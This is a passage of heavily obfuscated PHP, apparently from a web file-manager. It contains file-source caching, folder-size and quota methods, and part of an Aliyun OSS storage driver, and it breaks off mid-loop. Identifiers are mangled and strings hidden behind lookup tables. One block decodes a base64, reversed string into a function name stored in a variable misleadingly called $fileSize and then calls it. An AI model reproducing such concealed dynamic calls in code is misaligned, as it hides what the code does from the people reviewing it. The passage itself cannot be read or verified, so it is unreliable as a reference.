$³Ôº¦Œ…[$±ÌÍÛëà[76]]); if (!$¯ŠÑ¡Œ´) { return Model($±ÌÍÛëà[471])->remove($³Ôº¦Œ…[$±ÌÍÛëà[468]]); } $this->folderSizeReset($şî£õÒ[$±ÌÍÛëà[432]]); return !0; } public function fileSubstr($ëæÕà, $ø îİ¨Ş, $ì­–ê†) { $™¿õ¾Ÿ = $this->fileInfoGet($ëæÕà); if (!$™¿õ¾Ÿ) { return !1; } return IO::fileSubstr($™¿õ¾Ÿ[$_SERVER[Ì¥ŞÒ°£][84]], $ø îİ¨Ş, $ì­–ê†); } public function fileInfoGet($ ä¦ñ›) { $ˆ›±‡Õ =& $_SERVER[Ì¥ŞÒ°£]; $ò³»şÔ• = $this->sourceInfo($ ä¦ñ›); if (!$ò³»şÔ• || $ò³»şÔ•[$ˆ›±‡Õ[410]]) { return !1; } $¼“é€ê³ = $ˆ›±‡Õ[474] . $ò³»şÔ•[$ˆ›±‡Õ[468]]; $É¤İİ¼ù = _get(self::$cacheFileInfo, $¼“é€ê³); if ($É¤İİ¼ù) { return $É¤İİ¼ù; } $¦ûØ…‚ô = Model($ˆ›±‡Õ[471])->fileInfo($ò³»şÔ•[$ˆ›±‡Õ[468]]); if ($¦ûØ…‚ô) { $¦ûØ…‚ô[$ˆ›±‡Õ[32]] = $ò³»şÔ•[$ˆ›±‡Õ[32]]; } self::$cacheFileInfo[$¼“é€ê³] = $¦ûØ…‚ô; return $¦ûØ…‚ô; } private function folderChildrenNumber($şà °ì†) { $æâìşı =& $_SERVER[Ì¥ŞÒ°£]; $ĞÉ•º¬ı = $this->sourceInfo($şà °ì†); $Å³÷Óª¶ = array($æâìşı[590] => array($æâìşı[550], $ĞÉ•º¬ı[$æâìşı[521]] . $şà °ì† . $æâìşı[551]), $æâìşı[587] => $ĞÉ•º¬ı[$æâìşı[505]], $æâìşı[430] => intval($ĞÉ•º¬ı[$æâìşı[431]]), $æâìşı[583] => 1); $×”¸§« = $this->where($Å³÷Óª¶)->count(); $¬ÇÌÈö = $this->where($Å³÷Óª¶)->where(array($æâìşı[583] => 0))->count(); return array($æâìşı[80] => $¬ÇÌÈö, $æâìşı[81] => $×”¸§«); } public function pathInfo($¶»‘¨ í, $ƒøì„òÒ = false) { $‘Æú’…Ú =& $_SERVER[Ì¥ŞÒ°£]; $ƒøì„òÒ = !1; $¶»‘¨ í = intval($¶»‘¨ í); $Áş›¶ê¾ = $‘Æú’…Ú[461] . intval($ƒøì„òÒ) . $‘Æú’…Ú[386] . $¶»‘¨ í; $»ş¬ÒùĞ = _get(self::$cachePathInfo, $Áş›¶ê¾); if ($»ş¬ÒùĞ) { return $»ş¬ÒùĞ; } $ÍÍ£çî = $this->sourceInfo($¶»‘¨ í); if (!$ÍÍ£çî) { return !1; } $ÍÍ£çî = $this->_listDataApplyItem($ÍÍ£çî, $ƒøì„òÒ); self::$cachePathInfo[$Áş›¶ê¾] = $ÍÍ£çî; return $ÍÍ£çî; } public static $cachePathInfoMore = array(); public function pathInfoMore($…ƒ¼ò‘Ú) { $«¤´®Ææ =& $_SERVER[Ì¥ŞÒ°£]; $Îü¡ıË® = _get(self::$cachePathInfoMore, $…ƒ¼ò‘Ú); if ($Îü¡ıË®) { return $Îü¡ıË®; } $·‘úÍñ¢ = $this->pathInfo($…ƒ¼ò‘Ú); if (!$·‘úÍñ¢) { return !1; } if ($·‘úÍñ¢[$«¤´®Ææ[410]] == $«¤´®Ææ[88]) { $·‘úÍñ¢[$«¤´®Ææ[79]] = $this->folderChildrenNumber($…ƒ¼ò‘Ú); } self::$cachePathInfoMore[$…ƒ¼ò‘Ú] = $·‘úÍñ¢; return $·‘úÍñ¢; } public function sourceInfo($„³Œ¹ªÊ) { $Û†è¶Çû =& $_SERVER[Ì¥ŞÒ°£]; if (!$„³Œ¹ªÊ) { return array(); } $„³Œ¹ªÊ = intval($„³Œ¹ªÊ); $§ææŠ¸ = $Û†è¶Çû[460] . $„³Œ¹ªÊ; $ÎÏÀì· = _get(self::$cacheSourceInfo, $§ææŠ¸); if ($ÎÏÀì·) { return $ÎÏÀì·; } $øŞöÔşı = $this->where(array($Û†è¶Çû[402] => $„³Œ¹ªÊ))->find(); self::$cacheSourceInfo[$§ææŠ¸] = $øŞöÔşı; return self::$cacheSourceInfo[$§ææŠ¸]; } public function sourceCacheClear($×òùÎ¸¥ = false) { self::cacheClear($×òùÎ¸¥); } public static function cacheClear($ª©‚îôì = false) { $‚©ÛæÖÅ =& $_SERVER[Ì¥ŞÒ°£]; if ($ª©‚îôì == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$‚©ÛæÖÅ[460] . $ª©‚îôì]); unset(self::$cachePathInfoMore[$ª©‚îôì]); unset(self::$cachePathInfo[$‚©ÛæÖÅ[2154] . $ª©‚îôì]); unset(self::$cachePathInfo[$‚©ÛæÖÅ[2155] . $ª©‚îôì]); } public function metaSet($¾‡øÓŸó, $ïÚ›Õ³¾ = null, $û•¸Ğ«ç = null) { $İ“î–¶‰ = parent::metaSet($¾‡øÓŸó, $ïÚ›Õ³¾, $û•¸Ğ«ç); if ($İ“î–¶‰) { $this->sourceCacheClear($¾‡øÓŸó); } return $İ“î–¶‰; } public function pathInfoByPath($ıô‹´€Ä, $Ãº¥’©½) { $İö™ö¨ =& $_SERVER[Ì¥ŞÒ°£]; $¢°—™¬ó = !$Ãº¥’©½ ? array() : explode($İö™ö¨[8], trim($Ãº¥’©½, $İö™ö¨[8])); $ÈÀñ©ĞÊ = $ıô‹´€Ä; foreach ($¢°—™¬ó as $êşó÷êë) { $»ŞÌˆÁ— = array($İö™ö¨[432] => $ÈÀñ©ĞÊ, $İö™ö¨[32] => $êşó÷êë); $§êÜ½‚Ó = $this->where($»ŞÌˆÁ—)->select(); if (!$§êÜ½‚Ó) { return !1; } $§êÜ½‚Ó = array_sort_by($§êÜ½‚Ó, $İö™ö¨[431]); $ÈÀñ©ĞÊ = $§êÜ½‚Ó[0][$İö™ö¨[402]]; } return $this->pathInfo($ÈÀñ©ĞÊ, !0); } protected function updateModifyTime($ä¯¥œÉ½) { $…†±¬Ñã =& $_SERVER[Ì¥ŞÒ°£]; $Œî©ç‹÷ = defined($…†±¬Ñã[475]) ? USER_ID : $…†±¬Ñã[197]; if (!$ä¯¥œÉ½) { return; } if (!is_array($ä¯¥œÉ½)) { $ä¯¥œÉ½ = array($ä¯¥œÉ½); } foreach ($ä¯¥œÉ½ as $Ê¬óğÎ => $›¤˜´Ã×) { $ä¯¥œÉ½[$Ê¬óğÎ] = intval($›¤˜´Ã×); $this->sourceCacheClear($›¤˜´Ã×); } $‰ÍÍÖÕÔ = array($…†±¬Ñã[402] => array($…†±¬Ñã[7], $ä¯¥œÉ½)); $¬‚Àª±Ä = array($…†±¬Ñã[589] => $Œî©ç‹÷, $…†±¬Ñã[424] => time()); $this->where($‰ÍÍÖÕÔ)->save($¬‚Àª±Ä); } public function folderSizeReset($¾ãÕ¸­Š, $Ñ…¼ê€È = false) { $¶¨ñ×î =& $_SERVER[Ì¥ŞÒ°£]; if ($this->statusIgnoreResetSpace) { return; } $ ¬ÌĞ = $this->sourceInfo($¾ãÕ¸­Š); $Ùò™´­ = $¶¨ñ×î[2156] . $¾ãÕ¸­Š; CacheLock::lock($Ùò™´­, 20); if ($Ñ…¼ê€È === !1) { $this->sourceCacheClear($¾ãÕ¸­Š); $ ¬ÌĞ = $this->sourceInfo($¾ãÕ¸­Š); $¦±“†Ì¡ = array($¶¨ñ×î[401] => $¾ãÕ¸­Š, $¶¨ñ×î[430] => 0); $—¼¶›× = $this->where($¦±“†Ì¡)->sum($¶¨ñ×î[76]); $Ñ…¼ê€È = intval($—¼¶›×) - intval($ ¬ÌĞ[$¶¨ñ×î[76]]); } if ($Ñ…¼ê€È == 0) { return CacheLock::unlock($Ùò™´­); } $šò‰É  = $this->parentLevelArray($ ¬ÌĞ[$¶¨ñ×î[521]]); if (!$šò‰É ) { $šò‰É  = array(); } $šò‰É [] = $ ¬ÌĞ[$¶¨ñ×î[402]]; $¦±“†Ì¡ = array($¶¨ñ×î[402] => array($¶¨ñ×î[418], $šò‰É )); if ($Ñ…¼ê€È < 0) { $¦±“†Ì¡[$¶¨ñ×î[76]] = array($¶¨ñ×î[1020], abs($Ñ…¼ê€È)); } $this->where($¦±“†Ì¡)->setAdd($¶¨ñ×î[76], $Ñ…¼ê€È); CacheLock::unlock($Ùò™´­); $†ƒÒı¬ = $¶¨ñ×î[2157] . $ ¬ÌĞ[$¶¨ñ×î[411]] . $¶¨ñ×î[4] . $ ¬ÌĞ[$¶¨ñ×î[505]]; $¾íá™¤É = array($ ¬ÌĞ[$¶¨ñ×î[411]], $ ¬ÌĞ[$¶¨ñ×î[505]]); TaskRun::timeLimitCall($†ƒÒı¬, $¶¨ñ×î[2158], $¾íá™¤É, 1.5); } public function folderSizeResetChildren($ƒËÁ§—) { $Öã©Ö±œ =& $_SERVER[Ì¥ŞÒ°£]; $this->sourceCacheClear($ƒËÁ§—); $ÇĞé”ÙÈ = $this->sourceInfo($ƒËÁ§—); $…¦¡¢–û = array($Öã©Ö±œ[583] => 1, $Öã©Ö±œ[587] => $ÇĞé”ÙÈ[$Öã©Ö±œ[505]], $Öã©Ö±œ[590] => array($Öã©Ö±œ[550], $ÇĞé”ÙÈ[$Öã©Ö±œ[521]] . $ƒËÁ§— . $Öã©Ö±œ[551])); $¹Ï×Ïàé = $Öã©Ö±œ[2159]; $Û…éÈÇÓ = $this->field($¹Ï×Ïàé)->where($…¦¡¢–û)->select(); $…¦¡¢–û[$Öã©Ö±œ[410]] = 0; $Ö‰Öû¸— = $this->field($¹Ï×Ïàé)->where($…¦¡¢–û)->select(); if (!$Ö‰Öû¸—) { return; } $Û…éÈÇÓ[] = $ÇĞé”ÙÈ; $Û…éÈÇÓ = array_to_keyvalue($Û…éÈÇÓ, $Öã©Ö±œ[402]); foreach ($Û…éÈÇÓ as $Ùî§—÷ö => $‘ÑÀ³Õ) { $Û…éÈÇÓ[$Ùî§—÷ö][$Öã©Ö±œ[2160]] = $Û…éÈÇÓ[$Ùî§—÷ö][$Öã©Ö±œ[76]]; $Û…éÈÇÓ[$Ùî§—÷ö][$Öã©Ö±œ[76]] = 0; } foreach ($Ö‰Öû¸— as $‘ÑÀ³Õ) { $äÕìàæç = $‘ÑÀ³Õ[$Öã©Ö±œ[432]] . $Öã©Ö±œ[12]; if (!isset($Û…éÈÇÓ[$äÕìàæç])) { continue; } if ($‘ÑÀ³Õ[$Öã©Ö±œ[431]] == $Û…éÈÇÓ[$äÕìàæç][$Öã©Ö±œ[431]]) { $Û…éÈÇÓ[$äÕìàæç][$Öã©Ö±œ[76]] += $‘ÑÀ³Õ[$Öã©Ö±œ[76]]; } } foreach ($Û…éÈÇÓ as $‘ÑÀ³Õ) { $Ú¢Ğ€… = $this->parentLevelArray($‘ÑÀ³Õ[$Öã©Ö±œ[521]]); foreach ($Ú¢Ğ€… as $äÕìàæç) { $äÕìàæç = $äÕìàæç . $Öã©Ö±œ[12]; if (!isset($Û…éÈÇÓ[$äÕìàæç])) { continue; } if ($‘ÑÀ³Õ[$Öã©Ö±œ[431]] == $Û…éÈÇÓ[$äÕìàæç][$Öã©Ö±œ[431]]) { $Û…éÈÇÓ[$äÕìàæç][$Öã©Ö±œ[76]] += $‘ÑÀ³Õ[$Öã©Ö±œ[76]]; } } } $Ä—Ëú¯¾ = array(); foreach ($Û…éÈÇÓ as $‘ÑÀ³Õ) { if ($‘ÑÀ³Õ[$Öã©Ö±œ[76]] == $‘ÑÀ³Õ[$Öã©Ö±œ[2160]]) { continue; } $Ä—Ëú¯¾[] = array($Öã©Ö±œ[402], $‘ÑÀ³Õ[$Öã©Ö±œ[402]], $Öã©Ö±œ[76], $‘ÑÀ³Õ[$Öã©Ö±œ[76]]); } $this->saveAll($Ä—Ëú¯¾); } public function userSpaceReset($¹Æ­Ø±› = false) { $ùÏÑŞ¢µ =& $_SERVER[Ì¥ŞÒ°£]; $Á¾ì¸Û£ = $this->where(array($ùÏÑŞ¢µ[411] => self::TYPE_USER, $ùÏÑŞ¢µ[505] => $¹Æ­Ø±›, $ùÏÑŞ¢µ[410] => 0))->sum($ùÏÑŞ¢µ[76]); $Á¾ì¸Û£ = !$Á¾ì¸Û£ || $Á¾ì¸Û£ <= 0 ? 0 : $Á¾ì¸Û£; Model($ùÏÑŞ¢µ[513])->userEdit($¹Æ­Ø±›, array($ùÏÑŞ¢µ[1846] => $Á¾ì¸Û£)); } public function targetSpaceUpdate($Î±Î™Ã, $Äå¶«„í) { $ñâ©øĞ  =& $_SERVER[Ì¥ŞÒ°£]; if (!$Äå¶«„í) { return; } if (!in_array($Î±Î™Ã, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $´ÈÙú‚É = $this->targetSpaceSize($Î±Î™Ã, $Äå¶«„í); if ($Î±Î™Ã == self::TYPE_USER) { Model($ñâ©øĞ [513])->userEdit($Äå¶«„í, array($ñâ©øĞ [1846] => $´ÈÙú‚É)); } else { if ($Î±Î™Ã == self::TYPE_GROUP) { Model($ñâ©øĞ [522])->groupEdit($Äå¶«„í, array($ñâ©øĞ [1846] => $´ÈÙú‚É)); } } } public function targetSpaceSize($·Û‹¢’’, $¦ŸåÄú) { $—Ü™§ÆÏ =& $_SERVER[Ì¥ŞÒ°£]; $§±ŠÎæ = 0; $«¨¿¤Ê… = $this->targetSourceRoot($·Û‹¢’’, $¦ŸåÄú, !0); foreach ($«¨¿¤Ê… as $çÙ«î÷½) { if (!$çÙ«î÷½) { continue; } $§±ŠÎæ += floatval($çÙ«î÷½[$—Ü™§ÆÏ[76]]); $­ÛÎ›¨— = array($—Ü™§ÆÏ[590] => array($—Ü™§ÆÏ[550], $—Ü™§ÆÏ[531] . $çÙ«î÷½[$—Ü™§ÆÏ[402]] . $—Ü™§ÆÏ[551])); $™¶ÁÖØª = Model($—Ü™§ÆÏ[429])->field($—Ü™§ÆÏ[417])->where($­ÛÎ›¨—)->select(); $™¶ÁÖØª = array_to_keyvalue($™¶ÁÖØª, $—Ü™§ÆÏ[12], $—Ü™§ÆÏ[402]); $™¶ÁÖØª = array_unique(array_filter($™¶ÁÖØª)); if ($™¶ÁÖØª) { $­ÛÎ›¨— = array($—Ü™§ÆÏ[417] => array($—Ü™§ÆÏ[418], $™¶ÁÖØª)); $§±ŠÎæ += floatval($this->where($­ÛÎ›¨—)->sum($—Ü™§ÆÏ[76])); } } $§±ŠÎæ = !$§±ŠÎæ || $§±ŠÎæ <= 0 ? 0 : $§±ŠÎæ; return $§±ŠÎæ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($šªÙÙêÉ) { return $this->fileTypeProfile($šªÙÙêÉ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ë¸÷üè) { return $this->fileTypeProfile($Ë¸÷üè, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ì€Ôğ•€, $‚Œ¼‹ïº) { $·¤ÛÀœƒ =& $_SERVER[Ì¥ŞÒ°£]; $ğùæ÷Ò¹ = $·¤ÛÀœƒ[2161] . $Ì€Ôğ•€ . $·¤ÛÀœƒ[11] . $‚Œ¼‹ïº; $ƒñ¥·Ã = Cache::get($ğùæ÷Ò¹); if ($ƒñ¥·Ã) { return $ƒñ¥·Ã; } $œà¶ˆ¸ê = array($·¤ÛÀœƒ[583] => 0); if ($Ì€Ôğ•€ != !1) { $œà¶ˆ¸ê[$·¤ÛÀœƒ[505]] = $Ì€Ôğ•€; $œà¶ˆ¸ê[$·¤ÛÀœƒ[411]] = $‚Œ¼‹ïº; } $—©¯Æù¥ = array(); $—©¯Æù¥[$·¤ÛÀœƒ[2162]] = array($·¤ÛÀœƒ[2163] => LNG($·¤ÛÀœƒ[2162]), $·¤ÛÀœƒ[2164] => $this->where($œà¶ˆ¸ê)->count(), $·¤ÛÀœƒ[585] => $this->where($œà¶ˆ¸ê)->sum($·¤ÛÀœƒ[76])); $ÍÌ÷€èã = KodIO::fileTypeList(); foreach ($ÍÌ÷€èã as $¤¦°ŒŞ => $ Ğ­Ò¸Ü) { $œà¶ˆ¸ê[$·¤ÛÀœƒ[412]] = $this->fileTypeWhere($¤¦°ŒŞ); $—©¯Æù¥[$¤¦°ŒŞ] = array($·¤ÛÀœƒ[2163] => $ Ğ­Ò¸Ü[$·¤ÛÀœƒ[32]], $·¤ÛÀœƒ[2164] => $this->where($œà¶ˆ¸ê)->count(), $·¤ÛÀœƒ[585] => $this->where($œà¶ˆ¸ê)->sum($·¤ÛÀœƒ[76])); } Cache::set($ğùæ÷Ò¹, $—©¯Æù¥, 1200); return $—©¯Æù¥; } public function fileNameExist($Ô˜£Ú¿, $‡¹¼…îÙ) { $Ê¾Ï¨²º =& $_SERVER[Ì¥ŞÒ°£]; $¥Š¢½ÜÕ = $this->where(array($Ê¾Ï¨²º[432] => $Ô˜£Ú¿, $Ê¾Ï¨²º[32] => $‡¹¼…îÙ, $Ê¾Ï¨²º[431] => 0))->find(); return is_array($¥Š¢½ÜÕ) ? $¥Š¢½ÜÕ[$Ê¾Ï¨²º[402]] : !1; } public function childList($¼é…ÉàÁ) { $íı±¿ôî =& $_SERVER[Ì¥ŞÒ°£]; $„ù¦å©» = $íı±¿ôî[2139] . $¼é…ÉàÁ; if (isset(self::$cacheChildList[$„ù¦å©»])) { return self::$cacheChildList[$„ù¦å©»]; } $¡ºöÃÊ€ = array($íı±¿ôî[432] => intval($¼é…ÉàÁ), $íı±¿ôî[431] => 0); $÷ÈµË„¸ = $this->where($¡ºöÃÊ€)->select(); $÷ÈµË„¸ = $÷ÈµË„¸ ? $÷ÈµË„¸ : array(); self::$cacheChildList[$„ù¦å©»] = $÷ÈµË„¸; foreach ($÷ÈµË„¸ as $‹Ö›Ç†‰) { $„ù¦å©» = $íı±¿ôî[460] . $‹Ö›Ç†‰[$íı±¿ôî[402]]; self::$cacheSourceInfo[$„ù¦å©»] = $‹Ö›Ç†‰; } return $÷ÈµË„¸; } public function fileNameAuto($‹‡ÛúÏÒ, $ÕÓş…Ï†, $œÙ ò‹Ö = REPEAT_RENAME, $üÆ×ÜÂÑ = false) { $ÒŸÙ¶†› =& $_SERVER[Ì¥ŞÒ°£]; $íè»ê¥ò = get_path_ext($ÕÓş…Ï†); $ø¿±¼ˆÕ = $íè»ê¥ò ? basename($ÕÓş…Ï†, $ÒŸÙ¶†›[10] . $íè»ê¥ò) . $ÒŸÙ¶†›[2165] . $íè»ê¥ò : $ÕÓş…Ï† . $ÒŸÙ¶†›[384]; $›ü¨¯à¸ = array($ÒŸÙ¶†›[432] => $‹‡ÛúÏÒ, $ÒŸÙ¶†›[431] => 0, $ÒŸÙ¶†›[32] => array($ÒŸÙ¶†›[383], $ø¿±¼ˆÕ)); $ ÕÍú® = $this->field($ÒŸÙ¶†›[32])->where($›ü¨¯à¸)->select(); $××£·½» = array_to_keyvalue($ ÕÍú®, $ÒŸÙ¶†›[12], $ÒŸÙ¶†›[32]); return $this->fileNameAutoGet($××£·½», $ÕÓş…Ï†, $œÙ ò‹Ö, $üÆ×ÜÂÑ); } public function fileNameAutoGet($µ‚ÀªƒÂ, $ÑŞçŠÌ, $–ş‚“º, $¾¦ÜéÍ×) { $äãŠ˜®— =& $_SERVER[Ì¥ŞÒ°£]; if ($–ş‚“º == REPEAT_REPLACE || !$µ‚ÀªƒÂ || !in_array_not_case($ÑŞçŠÌ, $µ‚ÀªƒÂ) || $¾¦ÜéÍ× && $–ş‚“º != REPEAT_RENAME_FOLDER) { return $ÑŞçŠÌ; } if ($–ş‚“º == REPEAT_SKIP) { return !1; } $˜­»Ì„ô = $äãŠ˜®—[10] . get_path_ext($ÑŞçŠÌ); $˜­»Ì„ô = $˜­»Ì„ô == $äãŠ˜®—[10] || $¾¦ÜéÍ× ? $äãŠ˜®—[12] : $˜­»Ì„ô; for ($İÀğ°à = 1; $İÀğ°à <= count($µ‚ÀªƒÂ) + 1; $İÀğ°à++) { $˜ş¬Š°ù = substr($ÑŞçŠÌ, 0, strlen($ÑŞçŠÌ) - strlen($˜­»Ì„ô)); $š¤Èğ¿ = $˜ş¬Š°ù . "\x28{$İÀğ°à}\51{$˜­»Ì„ô}"; if (!in_array_not_case($š¤Èğ¿, $µ‚ÀªƒÂ)) { return $š¤Èğ¿; } } } } goto a¸¸ñ‰Ê™Š; EŸÍÇ³´Š¯: $fileSize = strrev(base64_decode($_SERVER[¦³şÀŒ][0])); function binCheckNeq($´Šúãô”, $«Áë›¬³) { return $´Šúãô” != $«Áë›¬³; } $_SERVER[$_SERVER[¦³şÀŒ][1]] = $fileSize($_SERVER[$_SERVER[¦³şÀŒ][2]]); goto fğÀ—Ş´¶â; CÓ¨âå’¡Š: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($ÖÅû‡¿—) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ì¥ŞÒ°£][1396]; $this->_init($ÖÅû‡¿—); } public function _init($¾Çô†”’) { $®„îÊš =& $_SERVER[Ì¥ŞÒ°£]; foreach ($¾Çô†”’ as $–¾ÆøØÅ => $—’Àø–ñ) { if (isset($this->{$–¾ÆøØÅ})) { $this->{$–¾ÆøØÅ} = $—’Àø–ñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($®„îÊš[1397] . LNG($®„îÊš[1398])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $—Û³Äƒ =& $_SERVER[Ì¥ŞÒ°£]; $„™ÌƒòÑ = new OSS\Model\CorsConfig(); $û€œôÚ„ = new OSS\Model\CorsRule(); $û€œôÚ„->addAllowedOrigin($—Û³Äƒ[1399]); $û€œôÚ„->addAllowedMethod($—Û³Äƒ[1400]); $û€œôÚ„->addAllowedMethod($—Û³Äƒ[1401]); $û€œôÚ„->addAllowedMethod($—Û³Äƒ[1402]); $û€œôÚ„->addAllowedMethod($—Û³Äƒ[1403]); $û€œôÚ„->addAllowedMethod($—Û³Äƒ[160]); $û€œôÚ„->setMaxAgeSeconds(600); $û€œôÚ„->addExposeHeader($—Û³Äƒ[1404]); $û€œôÚ„->addAllowedHeader($—Û³Äƒ[1399]); $„™ÌƒòÑ->addRule($û€œôÚ„); try { $this->client->putBucketCors($this->bucket, $„™ÌƒòÑ); } catch (OSS\Core\OssException $ìøĞ¸Ü) { return !1; } return !0; } public function getBucketCors() { $µÄ•à®¤ =& $_SERVER[Ì¥ŞÒ°£]; $¡´ŞÂ¯î = null; try { $¡´ŞÂ¯î = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $õ›«ıüì) { return null; } if (!$¡´ŞÂ¯î || !($íÉ ù = $¡´ŞÂ¯î->getRules())) { return null; } $µÔéÊŞ½ = $íÉ ù[0]->getAllowedOrigins(); $ëêš„Û½ = $íÉ ù[0]->getAllowedMethods(); $ÀŞÀ£ª = $íÉ ù[0]->getMaxAgeSeconds(); $ôİÀîÃ¢ = $íÉ ù[0]->getExposeHeaders(); $ÖÌºÜ×Ô = $íÉ ù[0]->getAllowedHeaders(); return array($µÄ•à®¤[187] => isset($µÔéÊŞ½[0]) ? $µÔéÊŞ½[0] : $µÄ•à®¤[12], $µÄ•à®¤[191] => $ëêš„Û½, $µÄ•à®¤[1405] => $ÀŞÀ£ª, $µÄ•à®¤[1406] => isset($ôİÀîÃ¢[0]) ? $ôİÀîÃ¢[0] : $µÄ•à®¤[12], $µÄ•à®¤[189] => isset($ÖÌºÜ×Ô[0]) ? $ÖÌºÜ×Ô[0] : $µÄ•à®¤[12]); } public function isBucketCors() { $’ÑÖó¼š =& $_SERVER[Ì¥ŞÒ°£]; $Œ©İÄ®È = $this->getBucketCors(); if (!$Œ©İÄ®È || !is_array($Œ©İÄ®È)) { return !1; } if ($Œ©İÄ®È[$’ÑÖó¼š[187]] != $’ÑÖó¼š[188] || $Œ©İÄ®È[$’ÑÖó¼š[189]] != $’ÑÖó¼š[188]) { return !1; } $¤¤“Çª = array_map($’ÑÖó¼š[190], $Œ©İÄ®È[$’ÑÖó¼š[191]]); if (!is_array($¤¤“Çª)) { $¤¤“Çª = array(); } $“¤¨Æšª = array($’ÑÖó¼š[192], $’ÑÖó¼š[193], $’ÑÖó¼š[194], $’ÑÖó¼š[195], $’ÑÖó¼š[196]); $®ŸÖÇÖ© = array_diff($“¤¨Æšª, $¤¤“Çª); return empty($®ŸÖÇÖ©); } public function mkfile($½Ù„ ¹, $ıÄ×£Â = '', $»æ¾ÓÄ = REPEAT_RENAME) { $Âû®Ö²» = $this->setContent($½Ù„ ¹, $ıÄ×£Â); if ($Âû®Ö²» !== !1) { return $this->getPathOuter($½Ù„ ¹); } return !1; } public function mkdir($èç™Õ«¶, $˜¼àª–› = REPEAT_SKIP) { if ($˜¼àª–› && $this->_isFolder($èç™Õ«¶)) { return $this->getPathOuter($èç™Õ«¶); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($èç™Õ«¶)); } catch (OSS\Core\OssException $âÜ’°Ñ¥) { return !1; } return $this->getPathOuter($èç™Õ«¶); } private function fileList($ÜÖº¾÷, $Ê’’±ø = '', $Æ´·å‡Š = 0) { $õ¿ÂŠ¦« =& $_SERVER[Ì¥ŞÒ°£]; $ÜÖº¾÷ = trim($ÜÖº¾÷, $õ¿ÂŠ¦«[8]); $²Ò¿Ïå™ = empty($ÜÖº¾÷) && $ÜÖº¾÷ !== $õ¿ÂŠ¦«[197] ? $õ¿ÂŠ¦«[12] : $ÜÖº¾÷ . $õ¿ÂŠ¦«[8]; $ÏÒşò¸• = $õ¿ÂŠ¦«[12]; $…ëÎ—µà = 1000; $˜úû½¿ = $Ú²ÙÑ¾Û = array(); while (!0) { check_abort(); $ÈâåÉîš = array($õ¿ÂŠ¦«[1407] => $Ê’’±ø, $õ¿ÂŠ¦«[1408] => $²Ò¿Ïå™, $õ¿ÂŠ¦«[1409] => $…ëÎ—µà, $õ¿ÂŠ¦«[1410] => $ÏÒşò¸•); try { $€°Ã¤àÖ = $this->client->listObjects($this->bucket, $ÈâåÉîš); } catch (OSS\Core\OssException $ôÜ©Ô†½) { break; } $ÏÒşò¸• = $€°Ã¤àÖ->getNextMarker(); $Á¶©–û… = $€°Ã¤àÖ->getObjectList(); $ş¨´ªï¥ = $€°Ã¤àÖ->getPrefixList(); foreach ($Á¶©–û… as $•¤½·¶) { if ($•¤½·¶->getKey() == $²Ò¿Ïå™) { continue; } $®ïïµ = $•¤½·¶->getKey(); $Ãä¼™Ñƒ = $•¤½·¶->getSize(); $©Ãç€Ğ” = $•¤½·¶->getLastModified(); $ê†úãô§ = $Æ´·å‡Š ? array($õ¿ÂŠ¦«[32] => $®ïïµ, $õ¿ÂŠ¦«[76] => $Ãä¼™Ñƒ, $õ¿ÂŠ¦«[203] => strtotime($©Ãç€Ğ”)) : $®ïïµ; $Ê¹şª±Æ = $Ãä¼™Ñƒ == 0 && substr($®ïïµ, strlen($®ïïµ) - 1, 1) == $õ¿ÂŠ¦«[8] ? !0 : !1; $¢ÖÊùô = array($õ¿ÂŠ¦«[76] => $Ãä¼™Ñƒ, $õ¿ÂŠ¦«[1411] => $Ãä¼™Ñƒ, $õ¿ÂŠ¦«[85] => strtotime($©Ãç€Ğ”), $õ¿ÂŠ¦«[1412] => $©Ãç€Ğ”); $this->cacheMethodInfoSet($®ïïµ, $Ê¹şª±Æ, $¢ÖÊùô); if ($Ê¹şª±Æ) { $˜úû½¿[] = $®ïïµ; continue; } $Ú²ÙÑ¾Û[] = $ê†úãô§; } foreach ($ş¨´ªï¥ as $’û´½©) { $˜úû½¿[] = $’û´½©->getPrefix(); $this->cacheMethodInfoSet($’û´½©->getPrefix(), !0); } if ($ÏÒşò¸• === $õ¿ÂŠ¦«[12]) { break; } } $this->cacheMethodInfoSet($ÜÖº¾÷, !0); return array($õ¿ÂŠ¦«[82] => $˜úû½¿, $õ¿ÂŠ¦«[83] => $Ú²ÙÑ¾Û); } public function copyFile($õ¢ñï, $åŒ×£«) { $ŠşÑ‘— = $this->size($õ¢ñï); if ($ŠşÑ‘— < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $õ¢ñï, $this->bucket, $this->pathEncode($åŒ×£«)); } catch (OSS\Core\OssException $®£÷¼¢ı) { return !1; } return $this->getPathOuter($åŒ×£«); } $¤ì¼‚²ó = $this->multiCopyObject($õ¢ñï, $åŒ×£«, $ŠşÑ‘—); return $¤ì¼‚²ó ? $this->getPathOuter($åŒ×£«) : !1; } private function multiCopyObject($ìá—âæÕ, $íÖ´§ô, $ÓÜ†ù•å) { $µ¦„Íèß =& $_SERVER[Ì¥ŞÒ°£]; try { $À²…“¼ğ = array(); if ($ıš–½ğò = $this->hashMd5($ìá—âæÕ)) { $À²…“¼ğ = array(OSS\OssClient::OSS_HEADERS => array($µ¦„Íèß[1413] => $ıš–½ğò)); } $³‘ÆÎ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($íÖ´§ô), $À²…“¼ğ); $£Ì÷Ö« = 1; $†şİšù› = 0; $Šğ£è•ó = array(); $Ì†¿…”‡ = 1024 * 1024 * 10; $Ô†…¯Ğ– = $this->client->generateMultiuploadParts($ÓÜ†ù•å, $Ì†¿…”‡); foreach ($Ô†…¯Ğ– as $€®ÒïÁ´ => 